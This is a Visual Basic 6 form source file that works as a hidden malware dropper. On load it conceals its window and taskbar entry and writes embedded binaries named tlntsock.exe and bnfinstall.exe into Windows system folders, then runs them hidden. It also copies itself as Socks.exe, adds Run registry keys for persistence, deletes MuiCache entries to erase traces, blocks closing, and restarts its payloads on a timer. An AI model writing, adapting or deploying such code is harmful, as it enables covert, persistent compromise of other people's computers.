VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3015
   ScaleWidth      =   4560
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.Timer Timer1 
      Interval        =   10000
      Left            =   1200
      Top             =   1320
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim filename As String
Dim temp() As Byte
Dim tfrs As Long
Private Sub Form_Load()
Me.Hide
App.TaskVisible = False
If App.PrevInstance = True Then: End
tfrs = 0
On Error Resume Next
filename = "C:\windows\tlntsock.exe"
If CheckExeIsRun("bnfinstall.exe") = False Then
temp = LoadResData(102, "CUSTOM")
Open "c:\windows\system32\bnfinstall.exe" For Binary As #1
Put #1, 1, temp()
Close #1
Shell "c:\windows\system32\bnfinstall.exe", vbHide
End If
If LCase(App.Path) <> "c:\windows" Then
FileCopy App.Path & "\" & App.exeName & ".exe", "c:\windows" & "\" & "Socks" & ".exe"
End
End If
temp = LoadResData(101, "CUSTOM")
Open filename For Binary As #1
Put #1, 1, temp()
Close #1
Set fso = CreateObject("scripting.filesystemobject")
If fso.fileexists("c:\windows\system32\Socks.exe") = False Then: FileCopy "c:\windows\Socks.exe", "c:\windows\system32\Socks.exe"
If fso.fileexists("c:\windows\system32\tlntsock.exe") = False Then: FileCopy "c:\windows\tlntsock.exe", "c:\windows\system32\tlntsock.exe"
On Error Resume Next
Set w = CreateObject("wscript.shell")
w.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & "Socks", "c:\windows" & "\" & "Socks" & ".exe"
w.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & "tlntsock", filename
w.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & "Socks", "c:\windows" & "\" & "Socks" & ".exe"
w.regwrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & "tlntsock", filename
w.regdelete "HKCR\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\" & filename & ".FriendlyAppName"
w.regdelete "HKCR\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\" & "C:\windows\Socks.exe" & ".FriendlyAppName"
w.regdelete "HKCR\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\" & "C:\windows\system32\bnfinstall.exe" & ".FriendlyAppName"
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Cancel = -1
End Sub

Private Sub Form_Unload(Cancel As Integer)
Cancel = -1
End Sub

Private Sub Timer1_Timer()
tfrs = tfrs + 1
If tfrs = 30 And CheckExeIsRun("tlntsock.exe") Then
Shell "taskkill /f /im tlntsock.exe", vbHide
Shell filename, vbHide
End If
If CheckExeIsRun("tlntsock.exe") = False Then: Shell filename, vbHide
If CheckExeIsRun("bnfinstall.exe") = False Then: Shell "c:\windows\system32\bnfinstall.exe", vbHide
DoEvents
End Sub
Private Function CheckExeIsRun(exeName As String) As Boolean
On Error GoTo err
Dim WMI
Dim Obj
Dim Objs
CheckExeIsRun = False
Set WMI = GetObject("WinMgmts:")
Set Objs = WMI.InstancesOf("Win32_Process")
For Each Obj In Objs
If (InStr(UCase(exeName), UCase(Obj.Description)) <> 0) Then
CheckExeIsRun = True
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
End If
Next
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
err:
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
End Function
